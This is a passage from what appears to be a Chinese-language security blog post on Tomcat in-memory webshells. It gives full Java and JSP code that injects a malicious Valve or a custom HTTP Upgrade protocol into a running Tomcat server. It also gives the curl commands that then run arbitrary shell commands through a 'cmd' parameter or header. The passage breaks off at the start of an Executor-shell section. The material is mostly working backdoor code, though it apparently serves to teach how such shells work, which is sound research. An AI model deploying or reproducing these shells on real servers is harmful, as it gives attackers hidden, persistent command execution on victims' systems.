<span class="literal">true</span>;</span><br><span class="line">                <span class="type">String</span> <span class="variable">osTyp</span> <span class="operator">=</span> System.getProperty(<span class="string">&quot;os.name&quot;</span>);</span><br><span class="line">                <span class="keyword">if</span> (osTyp != <span class="literal">null</span> &amp;&amp; osTyp.toLowerCase().contains(<span class="string">&quot;win&quot;</span>)) &#123;</span><br><span class="line">                    isLinux = <span class="literal">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                String[] cmds = isLinux ? <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, request.getParameter(<span class="string">&quot;cmd&quot;</span>)&#125; : <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, request.getParameter(<span class="string">&quot;cmd&quot;</span>)&#125;;</span><br><span class="line">                <span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> Runtime.getRuntime().exec(cmds).getInputStream();</span><br><span class="line">                <span class="type">Scanner</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(in, <span class="string">&quot;GBK&quot;</span>).useDelimiter(<span class="string">&quot;\\A&quot;</span>);</span><br><span class="line">                <span class="type">String</span> <span class="variable">output</span> <span class="operator">=</span> s.hasNext() ? s.next() : <span class="string">&quot;&quot;</span>;</span><br><span class="line">                response.setCharacterEncoding(<span class="string">&quot;GBK&quot;</span>);</span><br><span class="line">                <span class="type">PrintWriter</span> <span class="variable">out</span> <span class="operator">=</span> response.getWriter();</span><br><span class="line">                out.println(output);</span><br><span class="line">                out.flush();</span><br><span class="line">                out.close();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">this</span>.getNext().invoke(request, response);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    evilStandardPipeline.addValve(evilValve);</span><br><span class="line">    out.println(<span class="string">&quot;inject success&quot;</span>);</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p>上面的这个是采用了从<code>StandardContext</code>反射获取<code>StandardPipeline</code>的方式，效果如下：</p><p><img src="https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240130164016715.png"></p><p><img src="https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240130164029228.png"></p><p>下面的则是调用 <code>standardContext.getPipeline().addValve</code>实现的：</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Field&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.connector.Request&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.valves.ValveBase&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.connector.Response&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.IOException&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.*&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.InputStream&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.Scanner&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.PrintWriter&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">  <span class="keyword">class</span> <span class="title class_">testEvilValve</span> <span class="keyword">extends</span> <span class="title class_">ValveBase</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">invoke</span><span class="params">(Request request, Response response)</span> <span class="keyword">throws</span> ServletException,IOException &#123;</span><br><span class="line">      <span class="keyword">if</span> (request.getParameter(<span class="string">&quot;command&quot;</span>) != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">isLinux</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">osTyp</span> <span class="operator">=</span> System.getProperty(<span class="string">&quot;os.name&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (osTyp != <span class="literal">null</span> &amp;&amp; osTyp.toLowerCase().contains(<span class="string">&quot;win&quot;</span>)) &#123;</span><br><span class="line">          isLinux = <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        String[] cmds = isLinux ? <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, request.getParameter(<span class="string">&quot;command&quot;</span>)&#125; : <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, request.getParameter(<span class="string">&quot;command&quot;</span>)&#125;;</span><br><span class="line">        <span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> Runtime.getRuntime().exec(cmds).getInputStream();</span><br><span class="line">        <span class="type">Scanner</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(in, <span class="string">&quot;GBK&quot;</span>).useDelimiter(<span class="string">&quot;\\A&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">output</span> <span class="operator">=</span> s.hasNext() ? s.next() : <span class="string">&quot;&quot;</span>;</span><br><span class="line">        response.setCharacterEncoding(<span class="string">&quot;GBK&quot;</span>);</span><br><span class="line">        <span class="type">PrintWriter</span> <span class="variable">out</span> <span class="operator">=</span> response.getWriter();</span><br><span class="line">        out.println(output);</span><br><span class="line">        out.flush();</span><br><span class="line">        out.close();</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="built_in">this</span>.getNext().invoke(request, response);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;;</span><br><span class="line">%&gt;</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">  <span class="type">Field</span> <span class="variable">requestField</span> <span class="operator">=</span> request.getClass().getDeclaredField(<span class="string">&quot;request&quot;</span>);</span><br><span class="line">  requestField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">  <span class="keyword">final</span> <span class="type">Request</span> <span class="variable">req</span> <span class="operator">=</span> (Request) requestField.get(request);</span><br><span class="line">  <span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) req.getContext();</span><br><span class="line">  standardContext.getPipeline().addValve(<span class="keyword">new</span> <span class="title class_">testEvilValve</span>());</span><br><span class="line">  out.println(<span class="string">&quot;inject success&quot;</span>);</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p>效果如下：</p><p><img src="https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240130164109133.png"></p><p><img src="https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240130164219944.png"></p><h2 id="5-2-Tomcat-Upgrade内存马"><a href="#5-2-Tomcat-Upgrade内存马" class="headerlink" title="5.2 Tomcat Upgrade内存马"></a>5.2 Tomcat Upgrade内存马</h2><p>由<code>2.14.2</code>节中的分析，我们可以写出如下<code>java</code>代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.connector.Connector;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.connector.RequestFacade;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.connector.Request;</span><br><span class="line"><span class="keyword">import</span> org.apache.coyote.Adapter;</span><br><span class="line"><span class="keyword">import</span> org.apache.coyote.Processor;</span><br><span class="line"><span class="keyword">import</span> org.apache.coyote.UpgradeProtocol;</span><br><span class="line"><span class="keyword">import</span> org.apache.coyote.Response;</span><br><span class="line"><span class="keyword">import</span> org.apache.coyote.http11.AbstractHttp11Protocol;</span><br><span class="line"><span class="keyword">import</span> org.apache.coyote.http11.upgrade.InternalHttpUpgradeHandler;</span><br><span class="line"><span class="keyword">import</span> org.apache.tomcat.util.net.SocketWrapperBase;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.ByteBuffer;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="meta">@WebServlet(&quot;/evil&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestUpgrade</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">MyUpgrade</span> <span class="keyword">implements</span> <span class="title class_">UpgradeProtocol</span> &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> String <span class="title function_">getHttpUpgradeName</span><span class="params">(<span class="type">boolean</span> b)</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="type">byte</span>[] getAlpnIdentifier() &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">0</span>];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> String <span class="title function_">getAlpnName</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> Processor <span class="title function_">getProcessor</span><span class="params">(SocketWrapperBase&lt;?&gt; socketWrapperBase, Adapter adapter)</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> InternalHttpUpgradeHandler <span class="title function_">getInternalUpgradeHandler</span><span class="params">(SocketWrapperBase&lt;?&gt; socketWrapperBase, Adapter adapter, org.apache.coyote.Request request)</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">accept</span><span class="params">(org.apache.coyote.Request request)</span> &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">p</span> <span class="operator">=</span> request.getHeader(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                String[] cmd = System.getProperty(<span class="string">&quot;os.name&quot;</span>).toLowerCase().contains(<span class="string">&quot;win&quot;</span>) ? <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, p&#125; : <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;/bin/sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, p&#125;;</span><br><span class="line">                <span class="type">Field</span> <span class="variable">response</span> <span class="operator">=</span> org.apache.coyote.Request.class.getDeclaredField(<span class="string">&quot;response&quot;</span>);</span><br><span class="line">                response.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                <span class="type">Response</span> <span class="variable">resp</span> <span class="operator">=</span> (Response) response.get(request);</span><br><span class="line">                <span class="type">byte</span>[] result = <span class="keyword">new</span> <span class="title class_">java</span>.util.Scanner(<span class="keyword">new</span> <span class="title class_">ProcessBuilder</span>(cmd).start().getInputStream(), <span class="string">&quot;GBK&quot;</span>).useDelimiter(<span class="string">&quot;\\A&quot;</span>).next().getBytes();</span><br><span class="line">                resp.setCharacterEncoding(<span class="string">&quot;GBK&quot;</span>);</span><br><span class="line">                resp.doWrite(ByteBuffer.wrap(result));</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception ignored) &#123;&#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">RequestFacade</span> <span class="variable">rf</span> <span class="operator">=</span> (RequestFacade) req;</span><br><span class="line">            <span class="type">Field</span> <span class="variable">requestField</span> <span class="operator">=</span> RequestFacade.class.getDeclaredField(<span class="string">&quot;request&quot;</span>);</span><br><span class="line">            requestField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="type">Request</span> <span class="variable">request1</span> <span class="operator">=</span> (Request) requestField.get(rf);</span><br><span class="line"></span><br><span class="line">            <span class="type">Field</span> <span class="variable">connector</span> <span class="operator">=</span> Request.class.getDeclaredField(<span class="string">&quot;connector&quot;</span>);</span><br><span class="line">            connector.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="type">Connector</span> <span class="variable">realConnector</span> <span class="operator">=</span> (Connector) connector.get(request1);</span><br><span class="line"></span><br><span class="line">            <span class="type">Field</span> <span class="variable">protocolHandlerField</span> <span class="operator">=</span> Connector.class.getDeclaredField(<span class="string">&quot;protocolHandler&quot;</span>);</span><br><span class="line">            protocolHandlerField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="type">AbstractHttp11Protocol</span> <span class="variable">handler</span> <span class="operator">=</span> (AbstractHttp11Protocol) protocolHandlerField.get(realConnector);</span><br><span class="line"></span><br><span class="line">            HashMap&lt;String, UpgradeProtocol&gt; upgradeProtocols;</span><br><span class="line">            <span class="type">Field</span> <span class="variable">upgradeProtocolsField</span> <span class="operator">=</span> AbstractHttp11Protocol.class.getDeclaredField(<span class="string">&quot;httpUpgradeProtocols&quot;</span>);</span><br><span class="line">            upgradeProtocolsField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            upgradeProtocols = (HashMap&lt;String, UpgradeProtocol&gt;) upgradeProtocolsField.get(handler);</span><br><span class="line"></span><br><span class="line">            <span class="type">MyUpgrade</span> <span class="variable">myUpgrade</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MyUpgrade</span>();</span><br><span class="line">            upgradeProtocols.put(<span class="string">&quot;hello&quot;</span>, myUpgrade);</span><br><span class="line"></span><br><span class="line">            upgradeProtocolsField.set(handler, upgradeProtocols);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception ignored) &#123;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行之后执行命令<code>curl -H &quot;Connection: Upgrade&quot; -H &quot;Upgrade: hello&quot; -H &quot;cmd: dir&quot; http://localhost:8080/evil</code>，结果如下：</p><p><img src="https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240131162725549.png"></p><p><code>jsp</code>版本为：</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Field&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.connector.Connector&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.coyote.http11.AbstractHttp11Protocol&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.coyote.UpgradeProtocol&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.HashMap&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.coyote.Processor&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.tomcat.util.net.SocketWrapperBase&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.coyote.Adapter&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.coyote.http11.upgrade.InternalHttpUpgradeHandler&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.connector.Request&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.nio.ByteBuffer&quot;</span> %&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">MyUpgrade</span> <span class="keyword">implements</span> <span class="title class_">UpgradeProtocol</span> &#123;</span><br><span class="line">        <span class="keyword">public</span> String <span class="title function_">getHttpUpgradeName</span><span class="params">(<span class="type">boolean</span> isSSLEnabled)</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;hello&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="type">byte</span>[] getAlpnIdentifier() &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">0</span>];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> String <span class="title function_">getAlpnName</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> Processor <span class="title function_">getProcessor</span><span class="params">(SocketWrapperBase&lt;?&gt; socketWrapper, Adapter adapter)</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> InternalHttpUpgradeHandler <span class="title function_">getInternalUpgradeHandler</span><span class="params">(SocketWrapperBase&lt;?&gt; socketWrapper, Adapter adapter, org.apache.coyote.Request request)</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">accept</span><span class="params">(org.apache.coyote.Request request)</span> &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">p</span> <span class="operator">=</span> request.getHeader(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                String[] cmd = System.getProperty(<span class="string">&quot;os.name&quot;</span>).toLowerCase().contains(<span class="string">&quot;win&quot;</span>) ? <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, p&#125; : <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;/bin/sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, p&#125;;</span><br><span class="line">                <span class="type">Field</span> <span class="variable">response</span> <span class="operator">=</span> org.apache.coyote.Request.class.getDeclaredField(<span class="string">&quot;response&quot;</span>);</span><br><span class="line">                response.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                org.apache.coyote.<span class="type">Response</span> <span class="variable">resp</span> <span class="operator">=</span> (org.apache.coyote.Response) response.get(request);</span><br><span class="line">                <span class="type">byte</span>[] result = <span class="keyword">new</span> <span class="title class_">java</span>.util.Scanner(<span class="keyword">new</span> <span class="title class_">ProcessBuilder</span>(cmd).start().getInputStream(), <span class="string">&quot;GBK&quot;</span>).useDelimiter(<span class="string">&quot;\\A&quot;</span>).next().getBytes();</span><br><span class="line">                resp.setCharacterEncoding(<span class="string">&quot;GBK&quot;</span>);</span><br><span class="line">                resp.doWrite(ByteBuffer.wrap(result));</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception ignored)&#123;&#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    <span class="type">Field</span> <span class="variable">reqF</span> <span class="operator">=</span> request.getClass().getDeclaredField(<span class="string">&quot;request&quot;</span>);</span><br><span class="line">    reqF.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">Request</span> <span class="variable">req</span> <span class="operator">=</span> (Request) reqF.get(request);</span><br><span class="line">    <span class="type">Field</span> <span class="variable">conn</span> <span class="operator">=</span> Request.class.getDeclaredField(<span class="string">&quot;connector&quot;</span>);</span><br><span class="line">    conn.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">Connector</span> <span class="variable">connector</span> <span class="operator">=</span> (Connector) conn.get(req);</span><br><span class="line">    <span class="type">Field</span> <span class="variable">proHandler</span> <span class="operator">=</span> Connector.class.getDeclaredField(<span class="string">&quot;protocolHandler&quot;</span>);</span><br><span class="line">    proHandler.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">AbstractHttp11Protocol</span> <span class="variable">handler</span> <span class="operator">=</span> (AbstractHttp11Protocol) proHandler.get(connector);</span><br><span class="line">    HashMap&lt;String, UpgradeProtocol&gt; upgradeProtocols = <span class="literal">null</span>;</span><br><span class="line">    <span class="type">Field</span> <span class="variable">upgradeProtocolsField</span> <span class="operator">=</span> AbstractHttp11Protocol.class.getDeclaredField(<span class="string">&quot;httpUpgradeProtocols&quot;</span>);</span><br><span class="line">    upgradeProtocolsField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    upgradeProtocols = (HashMap&lt;String, UpgradeProtocol&gt;) upgradeProtocolsField.get(handler);</span><br><span class="line">    upgradeProtocols.put(<span class="string">&quot;hello&quot;</span>, <span class="keyword">new</span> <span class="title class_">MyUpgrade</span>());</span><br><span class="line">    upgradeProtocolsField.set(handler, upgradeProtocols);</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p>启动项目之后执行以下两条命令：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">curl</span> http://localhost:<span class="number">8080</span>/<span class="number">666</span>.jsp</span><br><span class="line"><span class="built_in">curl</span> <span class="literal">-H</span> <span class="string">&quot;Connection: Upgrade&quot;</span> <span class="literal">-H</span> <span class="string">&quot;Upgrade: hello&quot;</span> <span class="literal">-H</span> <span class="string">&quot;cmd: dir&quot;</span> http://localhost:<span class="number">8080</span>/<span class="number">666</span>.jsp</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240131164918339.png"></p><h2 id="5-3-Tomcat-Executor内存马"><a href="#5-3-Tomcat-Executor内存马" class="headerlink" title="5.3 Tomcat Executor内存马"></a>5.3 Tomcat Executor内存马</h2><p>由<code>2.15.2.3</code>的分析，我们可以写出下面的内存马：</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span 